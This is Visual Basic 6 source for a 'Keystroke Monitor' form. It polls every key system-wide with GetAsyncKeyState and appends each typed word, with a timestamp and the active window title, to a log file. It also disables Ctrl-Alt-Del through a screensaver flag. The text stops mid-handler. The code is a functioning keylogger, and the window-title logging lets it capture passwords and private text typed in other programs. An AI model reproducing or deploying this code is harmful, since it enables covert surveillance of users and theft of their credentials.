VERSION 5.00
Begin VB.Form Keystroke 
   BackColor       =   &H8000000A&
   Caption         =   "Keystroke Monitor "
   ClientHeight    =   6570
   ClientLeft      =   1770
   ClientTop       =   1275
   ClientWidth     =   8445
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6570
   ScaleWidth      =   8445
   Begin VB.Timer Timer3 
      Interval        =   5
      Left            =   3840
      Top             =   3960
   End
   Begin VB.CheckBox Check5 
      BackColor       =   &H8000000B&
      Caption         =   "Enable Crtl Alt Del"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   6720
      TabIndex        =   23
      Top             =   3360
      Width           =   1575
   End
   Begin VB.ListBox List3 
      Height          =   450
      ItemData        =   "Keystroke.frx":0000
      Left            =   4560
      List            =   "Keystroke.frx":0002
      TabIndex        =   22
      Top             =   6000
      Width           =   3735
   End
   Begin VB.ListBox List2 
      Height          =   450
      ItemData        =   "Keystroke.frx":0004
      Left            =   4560
      List            =   "Keystroke.frx":0006
      TabIndex        =   19
      Top             =   5160
      Width           =   3735
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H0000FFFF&
      Caption         =   "Get Word Info"
      Height          =   450
      Left            =   4560
      TabIndex        =   18
      Top             =   4320
      Width           =   1815
   End
   Begin VB.ListBox List1 
      Height          =   840
      ItemData        =   "Keystroke.frx":0008
      Left            =   6480
      List            =   "Keystroke.frx":000A
      Sorted          =   -1  'True
      TabIndex        =   17
      Top             =   3960
      Width           =   1815
   End
   Begin VB.Timer Timer2 
      Interval        =   50
      Left            =   600
      Top             =   1920
   End
   Begin VB.CheckBox Check4 
      BackColor       =   &H8000000B&
      Caption         =   "Monitor"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   5760
      TabIndex        =   14
      TabStop         =   0   'False
      ToolTipText     =   "Determines whether or not the program will monitor the keyboard."
      Top             =   3360
      Value           =   1  'Checked
      Width           =   1095
   End
   Begin VB.CheckBox Check3 
      BackColor       =   &H8000000B&
      Caption         =   "Log Alpha- Numeric Keys"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   3600
      TabIndex        =   11
      TabStop         =   0   'False
      ToolTipText     =   "A, a, B, b, C, c, D, d,"",:,.,/,\ etc..."
      Top             =   3360
      Value           =   1  'Checked
      Width           =   2295
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H8000000B&
      Caption         =   "Log All Other 'Action' Keys"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   1320
      TabIndex        =   8
      TabStop         =   0   'False
      ToolTipText     =   "Enter, Alt, Tab, Esc, Delete etc..."
      Top             =   3360
      Value           =   1  'Checked
      Width           =   2295
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H8000000B&
      Caption         =   "Log 'Shift' "
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   120
      Picture         =   "Keystroke.frx":000C
      TabIndex        =   2
      TabStop         =   0   'False
      ToolTipText     =   "Determines whether or not the progam will display '(shift)' when shift is pressed."
      Top             =   3360
      UseMaskColor    =   -1  'True
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3135
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      TabStop         =   0   'False
      Top             =   120
      Width           =   8175
   End
   Begin VB.Timer Timer1 
      Interval        =   5
      Left            =   1800
      Top             =   1560
   End
   Begin VB.Label Label15 
      BackColor       =   &H8000000B&
      Caption         =   "Words You've Typed:"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   4800
      TabIndex        =   24
      Top             =   3960
      Width           =   1815
   End
   Begin VB.Label Label14 
      BackColor       =   &H8000000B&
      Caption         =   "Location:"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   4560
      TabIndex        =   21
      Top             =   5760
      Width           =   1215
   End
   Begin VB.Label Label13 
      BackColor       =   &H8000000B&
      Caption         =   "Time:"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   4560
      TabIndex        =   20
      Top             =   4920
      Width           =   2415
   End
   Begin VB.Label Label12 
      BackColor       =   &H8000000B&
      Caption         =   "Label12"
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   1800
      TabIndex        =   5
      Top             =   4800
      Width           =   1215
   End
   Begin VB.Label Label11 
      BackColor       =   &H8000000B&
      Caption         =   "Operating System:"
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   120
      TabIndex        =   4
      Top             =   4800
      Width           =   1335
   End
   Begin VB.Label Label4 
      BackColor       =   &H8000000B&
      Caption         =   "Label4"
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   1800
      TabIndex        =   16
      Top             =   5520
      Width           =   2295
   End
   Begin VB.Label Label3 
      BackColor       =   &H8000000B&
      Caption         =   "Logged In At:"
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   120
      TabIndex        =   15
      Top             =   5520
      Width           =   1215
   End
   Begin VB.Label Label10 
      BackColor       =   &H8000000B&
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   1800
      TabIndex        =   13
      Top             =   6240
      Width           =   2535
   End
   Begin VB.Label Label9 
      BackColor       =   &H8000000B&
      Caption         =   "Words Typed:"
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   120
      TabIndex        =   12
      Top             =   6240
      Width           =   1215
   End
   Begin VB.Label Label8 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Label8"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   1800
      TabIndex        =   10
      Top             =   5880
      Width           =   2895
   End
   Begin VB.Label Label7 
      BackColor       =   &H8000000B&
      Caption         =   "Keystrokes Logged:"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   120
      TabIndex        =   9
      Top             =   5880
      Width           =   1695
   End
   Begin VB.Label Label6 
      BackColor       =   &H8000000B&
      Caption         =   "Label6"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   1800
      TabIndex        =   7
      Top             =   5160
      Width           =   2775
   End
   Begin VB.Label Label5 
      BackColor       =   &H8000000B&
      Caption         =   "Current Time:"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   120
      TabIndex        =   6
      Top             =   5160
      Width           =   1215
   End
   Begin VB.Label Label2 
      BackColor       =   &H8000000B&
      Caption         =   "Label2"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   120
      TabIndex        =   3
      Top             =   4440
      Width           =   4335
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000B&
      Caption         =   "Label1"
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   120
      TabIndex        =   1
      Top             =   4080
      Width           =   4215
   End
End
Attribute VB_Name = "Keystroke"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim stringbuffer As String
Dim numwritten As Long
Dim hfile As Long
Dim retval As Long
Private KeyLoop As Byte
Private FoundKeys As String
Private KeyResult As Long
Private Enter As Boolean
Private Period As Boolean
Private Comma As Boolean
Private Space As Boolean
Private Colon As Boolean
Private Slash As Boolean
Private Shift As Boolean
Private bTab As Boolean
Private Control As Boolean
Private Escape As Boolean
Private CapsLock As Boolean
Private Alt As Boolean
Private Delete As Boolean
Private Insert As Boolean
Private BackSpace As Boolean
Private Home As Boolean
Private bEnd As Boolean
Private PgUp As Boolean
Private PgDown As Boolean
Private NumLock As Boolean
Private ScrollLock As Boolean
Private LeftArrow As Boolean
Private RightArrow As Boolean
Private UpArrow As Boolean
Private DownArrow As Boolean
Private NumPad0 As Boolean
Private NumPad1 As Boolean
Private NumPad2 As Boolean
Private NumPad3 As Boolean
Private NumPad4 As Boolean
Private NumPad5 As Boolean
Private NumPad6 As Boolean
Private NumPad7 As Boolean
Private NumPad8 As Boolean
Private NumPad9 As Boolean
Private Pause As Boolean
Private F1 As Boolean
Private F2 As Boolean
Private F3 As Boolean
Private F4 As Boolean
Private F5 As Boolean
Private F6 As Boolean
Private F7 As Boolean
Private F8 As Boolean
Private F9 As Boolean
Private F10 As Boolean
Private F11 As Boolean
Private F12 As Boolean
Private Apostraphie As Boolean
Private NumEnter As Boolean
Private OpenBracket As Boolean
Private CloseBracket As Boolean
Private BackSlash As Boolean
Private Equals As Boolean
Private Minus1 As Boolean
Private Apostraphie2 As Boolean
Private NumPlus As Boolean
Private NumTimes As Boolean
Private NumMinus As Boolean
Private NumDivide As Boolean
Private NumPeriod As Boolean
Private UPcase As Boolean
Private x As String
Private search As Boolean
Private usrname As String
Private shiftpress As Boolean
Private action As Boolean
Private alpha As Boolean
Private lengthA As Integer
Private listboxlist(10000) As String
Dim ActionKey As Boolean
Private cadenab As Boolean
Dim NewWord As Boolean
Private label_8 As Integer
Private tenlist(10000) As String
Private ing As Integer
Private record As Boolean

Private Sub Check1_Click()
If shiftpress = False Then
shiftpress = True
Exit Sub
End If
If shiftpress = True Then shiftpress = False
End Sub

Private Sub Check2_Click()
If action = True Then
action = False
Exit Sub
End If
If action = False Then action = True
End Sub

Private Sub Check3_Click()
If alpha = True Then
alpha = False
Exit Sub
End If
If alpha = False Then alpha = True
End Sub

Private Sub Check5_Click()
Dim ret As Integer
Dim pOld As Boolean
If Check5.Value = Checked Then ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
If Check5.Value = unckeched Then ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub

Private Sub Command1_Click()
List2.Clear
List3.Clear
Dim line As String
Dim num As Integer
Dim charA As String
Dim time As String
Dim length As Integer
Dim x As Integer
Dim wordchar As String
Dim charB As String
num = 0
Open "log.dat" For Input As #1
Do While Not EOF(1)
Line Input #1, line
For x = 1 To 50
charA = Mid(line, x, 1)
If charA = " " Then
    length = Len(line)
    wordchar = Left(line, x - 1)
    Exit For
End If
Debug.Print line
Next x
If wordchar = List1.Text Then
    num = num + 1
    For x = 1 To 100
        charB = Mid(line, x, 1)
        If charB = "-" Then
            length = Len(line)
            List3.AddItem Mid(line, x + 1, length - x)
            line = Left(line, x - 1)
            Exit For
        End If
    Next x
    For x = 1 To 100
        charA = Mid(line, x, 1)
        If charA = " " Then
            length = Len(line)
            time = Right(line, length - x)
            List2.AddItem time
            Exit For
        End If
    Next x
End If
Loop
Close #1
End Sub

Private Sub Form_Load()
Check1.MaskColor = 1
ing = 10
SpaceBar = False
Check5.Value = Checked
ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
cadenab = True
ActionKey = False
Open "log.dat" For Output As #1
Close #1
Dim os As OSVERSIONINFO
Dim retval As Long
os.dwOSVersionInfoSize = Len(os)
retval = GetVersionEx(os)
If os.dwPlatformId = 1 Then
    If os.dwMinorVersion < 1 Then
    Label12.Caption = "Windows 95"
    Else: Label12.Caption = "Windows 98"
    End If
End If
If os.dwPlatformId = 0 Then Label12.Caption = "Windows 3.x"
If os.dwPlatformId = 2 Then Label12.Caption = "Windows NT"
Label4.Caption = Now
Label10.Caption = 0
alpha = True
shiftpress = True
action = True
Label8.Caption = 0
Label6.Caption = Now
getnames
x = 1
search = True
End Sub

Private Sub Timer1_Timer()
    
    If search = True Then
    NumPlus = False
    KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        NumPlus = True
         GoTo KeyFound
    End If
    
    
        NumMinus = False
    KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        NumMinus = True
         GoTo KeyFound
    End If
    
    
        NumTimes = False
    KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        NumTimes = True
         GoTo KeyFound
    End If
    
    
        NumDivide = False
    KeyResult = GetAsyncKeyState(111)
    If KeyResult = -32767 Then
        NumDivide = True
         GoTo KeyFound
    End If
    
        
    NumPeriod = False
    KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        NumPeriod = True
         GoTo KeyFound
    End If
    
    Apostraphie2 = False
    KeyResult = GetAsyncKeyState(&HC0)
    If KeyResult = -32767 Then
        Apostraphie2 = True
         GoTo KeyFound
    End If
    
    
    Minus1 = False
    KeyResult = GetAsyncKeyState(&HBD)
    If KeyResult = -32767 Then
        Minus1 = True
         GoTo KeyFound
    End If
    
    
    Equals = False
    KeyResult = GetAsyncKeyState(&HBB)
    If KeyResult = -32767 Then
        Equals = True
         GoTo KeyFound
    End If
    
    
    BackSlash = False
    KeyResult = GetAsyncKeyState(&HDC)
    If KeyResult = -32767 Then
        BackSlash = True
         GoTo KeyFound
    End If
       
    
    OpenBracket = False
    KeyResult = GetAsyncKeyState(&HDB)
    If KeyResult = -32767 Then
        OpenBracket = True
         GoTo KeyFound
    End If
    
    
    CloseBracket = False
    KeyResult = GetAsyncKeyState(&HDD)
    If KeyResult = -32767 Then
        CloseBracket = True
         GoTo KeyFound
    End If
    
    
    NumEnter = False
    KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        NumEnter = True
         GoTo KeyFound
    End If
    
    
    Apostraphie = False
    KeyResult = GetAsyncKeyState(&HDE)
    If KeyResult = -32767 Then
        Apostraphie = True
         GoTo KeyFound
    End If
    
    
    F1 = False
    KeyResult = GetAsyncKeyState(112)
    If KeyResult = -32767 Then
        F1 = True
         GoTo KeyFound
    End If
    
    
    F2 = False
    KeyResult = GetAsyncKeyState(113)
    If KeyResult = -32767 Then
        F2 = True
         GoTo KeyFound
    End If
    
    
    F3 = False
    KeyResult = GetAsyncKeyState(114)
    If KeyResult = -32767 Then
        F3 = True
         GoTo KeyFound
    End If
    
    
    F4 = False
    KeyResult = GetAsyncKeyState(115)
    If KeyResult = -32767 Then
        F4 = True
         GoTo KeyFound
    End If
    
    
    F5 = False
    KeyResult = GetAsyncKeyState(116)
    If KeyResult = -32767 Then
        F5 = True
         GoTo KeyFound
    End If
    
    
    F6 = False
    KeyResult = GetAsyncKeyState(117)
    If KeyResult = -32767 Then
        F6 = True
         GoTo KeyFound
    End If
    
    
    F7 = False
    KeyResult = GetAsyncKeyState(118)
    If KeyResult = -32767 Then
        F7 = True
         GoTo KeyFound
    End If
    
    
    F8 = False
    KeyResult = GetAsyncKeyState(119)
    If KeyResult = -32767 Then
        F8 = True
         GoTo KeyFound
    End If
    
    
    F9 = False
    KeyResult = GetAsyncKeyState(120)
    If KeyResult = -32767 Then
        F9 = True
         GoTo KeyFound
    End If
    
    
    F10 = False
    KeyResult = GetAsyncKeyState(121)
    If KeyResult = -32767 Then
        F10 = True
         GoTo KeyFound
    End If
    
    
    F11 = False
    KeyResult = GetAsyncKeyState(122)
    If KeyResult = -32767 Then
        F11 = True
         GoTo KeyFound
    End If
    
    
    F12 = False
    KeyResult = GetAsyncKeyState(123)
    If KeyResult = -32767 Then
        F12 = True
         GoTo KeyFound
    End If
    
    
    Pause = False
    KeyResult = GetAsyncKeyState(19)
    If KeyResult = -32767 Then
        Pause = True
         GoTo KeyFound
    End If
    
    
    NumPad0 = False
    KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        NumPad0 = True
         GoTo KeyFound
    End If
    
    
    NumPad1 = False
    KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        NumPad1 = True
         GoTo KeyFound
    End If
    
    
    NumPad2 = False
    KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        NumPad2 = True
         GoTo KeyFound
    End If
    
    
    NumPad3 = False
    KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        NumPad3 = True
         GoTo KeyFound
    End If
    
    
    NumPad4 = False
    KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        NumPad4 = True
         GoTo KeyFound
    End If
    
    
    NumPad5 = False
    KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        NumPad5 = True
         GoTo KeyFound
    End If
    
    
    NumPad6 = False
    KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        NumPad6 = True
         GoTo KeyFound
    End If
    
    
    NumPad7 = False
    KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        NumPad7 = True
         GoTo KeyFound
    End If
    
    
    NumPad8 = False
    KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        NumPad8 = True
         GoTo KeyFound
    End If
    
    
    NumPad9 = False
    KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        NumPad9 = True
         GoTo KeyFound
    End If
    
    
    LeftArrow = False
    KeyResult = GetAsyncKeyState(37)
    If KeyResult = -32767 Then
        LeftArrow = True
         GoTo KeyFound
    End If
    
    
    RightArrow = False
    KeyResult = GetAsyncKeyState(39)
    If KeyResult = -32767 Then
        RightArrow = True
         GoTo KeyFound
    End If
    
    
    UpArrow = False
    KeyResult = GetAsyncKeyState(38)
    If KeyResult = -32767 Then
        UpArrow = True
         GoTo KeyFound
    End If
    
    
    DownArrow = False
    KeyResult = GetAsyncKeyState(40)
    If KeyResult = -32767 Then
        DownArrow = True
         GoTo KeyFound
    End If
    
    
    ScrollLock = False
    KeyResult = GetAsyncKeyState(&H91)
    If KeyResult = -32767 Then
        ScrollLock = True
         GoTo KeyFound
    End If
    
    
    NumLock = False
    KeyResult = GetAsyncKeyState(144)
    If KeyResult = -32767 Then
        NumLock = True
         GoTo KeyFound
    End If
    
    
    Home = False
    KeyResult = GetAsyncKeyState(36)
    If KeyResult = -32767 Then
        Home = True
         GoTo KeyFound
    End If
    
        
    bEnd = False
    KeyResult = GetAsyncKeyState(35)
    If KeyResult = -32767 Then
        bEnd = True
         GoTo KeyFound
    End If
    
    
    PgUp = False
    KeyResult = GetAsyncKeyState(33)
    If KeyResult = -32767 Then
        PgUp = True
         GoTo KeyFound
    End If
    
    
    PgDown = False
    KeyResult = GetAsyncKeyState(34)
    If KeyResult = -32767 Then
        PgDown = True
         GoTo KeyFound
    End If
    
    
    BackSpace = False
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        BackSpace = True
         GoTo KeyFound
    End If
    
    
    Insert = False
    KeyResult = GetAsyncKeyState(45)
    If KeyResult = -32767 Then
        Insert = True
         GoTo KeyFound
    End If
    
    
    Delete = False
    KeyResult = GetAsyncKeyState(46)
    If KeyResult = -32767 Then
        Delete = True
         GoTo KeyFound
    End If
    
    
    Alt = False
    KeyResult = GetAsyncKeyState(&H12)
    If KeyResult = -32767 Then
        Alt = True
         GoTo KeyFound
    End If
    
    
    CapsLock = False
    KeyResult = GetAsyncKeyState(20)
    If KeyResult = -32767 Then
        CapsLock = True
         GoTo KeyFound
    End If
    
    
    Escape = False
    KeyResult = GetAsyncKeyState(27)
    If KeyResult = -32767 Then
        Escape = True
         GoTo KeyFound
    End If
        
    
    Control = False
    KeyResult = GetAsyncKeyState(17)
    If KeyResult = -32767 Then
        Control = True
         GoTo KeyFound
    End If
        
        
    bTab = False
    KeyResult = GetAsyncKeyState(9)
    If KeyResult = -32767 Then
        bTab = True
         GoTo KeyFound
    End If
    
    
    Shift = False
    KeyResult = GetAsyncKeyState(16)
    If KeyResult = -32767 Then
       Shift = True
       UPcase = True
        GoTo KeyFound
    End If

    Enter = False
    KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
       Enter = True
        GoTo KeyFound
    End If


    Period = False
    KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        Period = True
        GoTo KeyFound
    End If


    Comma = False
    KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        Comma = True
        GoTo KeyFound
    End If

    
    Space = False
    KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        Space = True
        GoTo KeyFound
    End If


    Colon = False
    KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        Colon = True
        GoTo KeyFound
    End If


    Slash = False
    KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        Slash = True
        GoTo KeyFound
    End If
    
    Space = False
    If NewWord = True Then
    Space = True
    GoTo KeyFound
    End If

    If alpha = True Then
    KeyLoop = 41
    Do Until KeyLoop = 91
        KeyResult = GetAsyncKeyState(KeyLoop)
        Select Case UPcase
        Case Is = False
        ActionKey = False
        If KeyResult = -32767 Then
        Text1.Text = Text1.Text + LCase(Chr(KeyLoop))
        Label8.Caption = Label8.Caption + 1
        record = True
        ing = 10
        End If
        Case Else
        ing = 10
        record = True
        ActionKey = False
        If KeyResult = -32767 Then
        Label8.Caption = Label8.Caption + 1
        Select Case KeyLoop
            Case Is = 48
                Text1.Text = Text1.Text + ")"
            Case Is = 49
                Text1.Text = Text1.Text + "!"
            Case Is = 50
                Text1.Text = Text1.Text + "@"
            Case Is = 51
                Text1.Text = Text1.Text + "#"
            Case Is = 52
                Text1.Text = Text1.Text + "$"
            Case Is = 53
                Text1.Text = Text1.Text + "%"
            Case Is = 54
                Text1.Text = Text1.Text + "^"
            Case Is = 55
                Text1.Text = Text1.Text + "&"
            Case Is = 56
                Text1.Text = Text1.Text + "*"
            Case Is = 57
                Text1.Text = Text1.Text + "("
            Case Else
            Text1.Text = Text1.Text + (Chr(KeyLoop))
            UPcase = False
        End Select
        End If
        End Select
        KeyLoop = KeyLoop + 1
    Loop
    End If

Exit Sub

KeyFound:
    Label8.Caption = Label8.Caption + 1
    ing = 10
    If Enter Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Enter)" & vbCrLf
        Else: Text1 = Text1 & vbCrLf
        End If
        Exit Sub
    ElseIf Period Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "."
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + ">"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf Comma Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + ","
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "<"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf Space Then
        Open "log.dat" For Append As #1
        Dim x As Long
        Dim VarLength As Long
        Dim number
        VarLength = Len(Text1)
        word = Right(Text1, 2)
        number = Asc(word)
        For n = 33 To 127
            If n = number Then
            For m = 1 To 100
                word = Right(Text1, m)
                If Left(word, 1) = " " Then
                Exit For
                word = Right(Text1, m - 1)
                End If
            Next m
            End If
        Next n
        word = " " & word
        For x = 1 To 5
        If Left(word, 1) = " " Then
            VarLength = Len(word)
            word = Right(word, VarLength - 1)
        End If
    
        Next x
        
        For x = 1 To 5
        Select Case Right(word, 1)
        Case Is = "!"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "."
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "?"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = ":"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = ";"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = ","
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "/"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "\"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "|"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "="
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "+"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "_"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "-"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = ")"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "("
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "*"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "&"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "^"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "%"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "$"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "#"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "@"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "~"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        Case Is = "`"
            VarLength = Len(word)
            word = Left(word, VarLength - 1)
        End Select
        Next x
        If ActionKey = True Then
        VarLength = Len(word)
        word = Right(word, VarLength - 2)
        ActionKey = False
        End If
        word = REPLACE2(word, "(f1)", "")
        word = REPLACE2(word, "(f2)", "")
        word = REPLACE2(word, "(f3)", "")
        word = REPLACE2(word, "(f4)", "")
        word = REPLACE2(word, "(f5)", "")
        word = REPLACE2(word, "(f6)", "")
        word = REPLACE2(word, "(f7)", "")
        word = REPLACE2(word, "(f8)", "")
        word = REPLACE2(word, "(f9)", "")
        word = REPLACE2(word, "(f10)", "")
        word = REPLACE2(word, "(f11)", "")
        word = REPLACE2(word, "(f12)", "")
        word = REPLACE2(word, "(enter)", "")
        word = REPLACE2(word, "(shift)", "")
        word = REPLACE2(word, "(tab)", "")
        word = REPLACE2(word, "(caps lock)", "")
        word = REPLACE2(word, "(delete)", "")
        word = REPLACE2(word, "(control)", "")
        word = REPLACE2(word, "(alt)", "")
        word = REPLACE2(word, "(escape)", "")
        word = REPLACE2(word, "(insert)", "")
        word = REPLACE2(word, "(home)", "")
        word = REPLACE2(word, "(page up)", "")
        word = REPLACE2(word, "(page down)", "")
        word = REPLACE2(word, "(num lock)", "")
        word = REPLACE2(word, "(right arrow)", "")
        word = REPLACE2(word, "(left arrow)", "")
        word = REPLACE2(word, "(up arrow)", "")
        word = REPLACE2(word, "(down arrow)", "")
        word = REPLACE2(word, vbCrLf, "")
        If word <> "" Then
        For x = 1 To 10000
        If listboxlist(x) = word Then
        Exit For
        End If
        If listboxlist(x) = "" Then
        listboxlist(x) = word
        tenlist(x) = word
        List1.AddItem word
        record = False
        Exit For
        End If
        Next x
        Print #1, word & " " & Now & "-" & Wintext
        End If
        If NewWord = False Then
        Label10.Caption = Label10.Caption + 1
        End If
        Text1 = Text1 + " "
        ing = 10
        Close #1
        Exit Sub
    ElseIf Colon Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + ";"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + ":"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf Slash Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "/"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "?"
        UPcase = False
        Exit Sub
        End If
        Exit Sub
        End If
    ElseIf Shift Then
        If shiftpress = True Then
        ActionKey = True
        Text1 = Text1 + " (Shift) "
        End If
        UPcase = True
    ElseIf bTab Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf & "(Tab) " & vbCrLf
        End If
    ElseIf Control Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf & "(Control) " & vbCrLf
        End If
    ElseIf Escape Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Escape) " + vbCrLf
        End If
    ElseIf CapsLock Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Caps Lock) " & vbCrLf
        End If
    ElseIf Alt Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Alt) " & vbCrLf
        End If
    ElseIf Delete Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Delete) " & vbCrLf
        End If
    ElseIf Insert Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Insert) " & vbCrLf
        End If
    ElseIf BackSpace Then
        Dim lengthB As String
        lengthB = Len(Text1)
        On Error Resume Next
        Text1 = Left(Text1, length - 1)
    ElseIf Home Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Home) " & vbCrLf
        End If
    ElseIf bEnd Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(End) " & vbCrLf
        End If
    ElseIf PgUp Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Page Up) " & vbCrLf
        End If
    ElseIf PgDown Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Page Down) " & vbCrLf
        End If
    ElseIf NumLock Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Num Lock) " & vbCrLf
        End If
    ElseIf ScrollLock Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Scroll Lock) " & vbCrLf
        End If
    ElseIf UpArrow Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Up Arrow) " & vbCrLf
        End If
    ElseIf DownArrow Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Down Arrow) " & vbCrLf
        End If
    ElseIf LeftArrow Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Left Arrow) " & vbCrLf
        End If
    ElseIf RightArrow Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 & vbCrLf + "(Right Arrow) " & vbCrLf
        End If
    ElseIf NumPad0 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "0"
        End If
    ElseIf NumPad1 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "1"
        End If
    ElseIf NumPad2 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "2"
        End If
    ElseIf NumPad3 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "3"
        End If
